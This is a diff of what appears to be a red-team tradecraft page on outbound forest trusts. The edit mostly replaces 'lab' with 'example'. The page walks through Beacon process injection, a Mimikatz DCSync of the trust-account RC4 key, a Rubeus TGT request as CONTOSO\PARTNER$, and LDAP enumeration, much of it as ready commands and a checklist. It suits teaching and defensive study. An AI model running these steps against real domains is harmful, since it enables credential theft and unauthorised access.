@@ -1,6 +1,6 @@
 ---
 title: "Outbound Trusts · Trust Accounts and Enumeration"
-description: "Identify the outbound trust perspective, recover the lab trust-account secret with existing replication rights and request a remote-domain TGT for enumeration."
+description: "Identify the outbound trust perspective, recover the example trust-account secret with existing replication rights and request a remote-domain TGT for enumeration."
 category: "Forest & Domain Trusts"
 tools: ["Cobalt Strike", "Mimikatz", "Rubeus", "Kerbeus BOF", "PowerShell"]
 updated: "2026-11-11"
@@ -17,7 +17,7 @@ Trust:   PARTNER → CONTOSO
 Access:  CONTOSO users → PARTNER resources, if authorized
 ```
 
-The lab starts in PARTNER and uses a compromised trust secret to authenticate as **`CONTOSO\PARTNER$`**. That is an identity in CONTOSO, despite its name referring to PARTNER. The result enables access according to that account's rights, not automatic CONTOSO administration.
+The example starts in PARTNER and uses a compromised trust secret to authenticate as **`CONTOSO\PARTNER$`**. That is an identity in CONTOSO, despite its name referring to PARTNER. The result enables access according to that account's rights, not automatic CONTOSO administration.
 
 ## 2. Establish the current context and trust metadata
 
@@ -33,7 +33,7 @@ ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,
 
 # Baseline: ordinary PARTNER credentials may not bind to CONTOSO
 ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
-# Source example: Bind Failed: 49
+# Example result: Bind Failed: 49
 ```
 
 `trustDirection: 2` is outbound relative to PARTNER; attribute bit `8` indicates a forest trust. LDAP error 49 reports invalid credentials. The error alone is not proof of a particular Kerberos failure or of the absence of all possible access paths.
@@ -44,20 +44,20 @@ ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --
 |---|---|
 | `CONTOSO\PARTNER$` | Interdomain trust account in CONTOSO |
 | CONTOSO TDO in PARTNER | Stores the corresponding trust information and secrets |
-| TDO `objectGUID` | Selects the specific trust object for the lab replication query |
+| TDO `objectGUID` | Selects the specific trust object for the example replication query |
 | `[Out]` | Current outgoing secret material in the example output |
 | `[Out-1]` | Previous outgoing secret material |
 
-Select the key corresponding to the required direction and current trust state. Do not confuse it with either domain's `krbtgt` key. The lab uses the current RC4 value; RC4 acceptance depends on the KDC's supported encryption and policy.
+Select the key corresponding to the required direction and current trust state. Do not confuse it with either domain's `krbtgt` key. The example uses the current RC4 value; RC4 acceptance depends on the KDC's supported encryption and policy.
 
-## 4. Recover the lab secret with replication rights
+## 4. Recover the trust secret with replication rights
 
 This stage requires existing replication rights in PARTNER. An ordinary user reading trust metadata cannot recover the secret through that LDAP query.
 
-The lab obtains an appropriate context by injecting into an identified PARTNER administrative process. Skip this transition if a suitable context is already available.
+The example obtains an appropriate context by injecting into an identified PARTNER administrative process. Skip this transition if a suitable context is already available.
 
 ```shell
-# Optional lab context transition from the original elevated Beacon
+# Optional context transition from the original elevated Beacon
 ps
 inject <PARTNER_DA_PID> x64 tcp-local
 # Use the configured listener and select the NEW Beacon when available
@@ -80,7 +80,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PART
 # Expected if accepted: TGT for PARTNER$ @ CONTOSO.COM
 # Retain complete output as <TRUST_ACCOUNT_TGT_BASE64>
 
-# Alternative extension command from the lab; choose this OR Rubeus
+# Alternative extension command from the example; choose this OR Rubeus
 krb_asktgt /user:PARTNER$ /rc4:<TRUST_RC4> /domain:contoso.com /dc:lon-dc-1.contoso.com
 ```
 
@@ -104,7 +104,7 @@ run klist
 # Server: krbtgt/CONTOSO.COM
 
 ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
-# Lab result: name contoso and its domain SID
+# Example result: name contoso and its domain SID
 ```
 
 `FakePass` creates the network context; it is not the trust account's recovered password. The imported TGT supplies Kerberos material. The account's `primaryGroupID` is `513` in this scenario, which may not appear as an explicit `memberOf` entry.
@@ -154,7 +154,7 @@ PERSPECTIVE AND TDO
 [ ] Distinguish CONTOSO\PARTNER$ from an ordinary PARTNER-domain identity
 
 REPLICATION CONTEXT
-[ ] Optional lab transition: ps, then inject <PARTNER_DA_PID> x64 <LISTENER>
+[ ] Optional context transition: ps, then inject <PARTNER_DA_PID> x64 <LISTENER>
 [ ] Select the new Beacon if one was created; getuid
 [ ] mimikatz lsadump::dcsync /domain:partner.com /guid:{<CONTOSO_TDO_GUID>}
 [ ] Select the matching current [Out] trust key, rather than [Out-1] or krbtgt
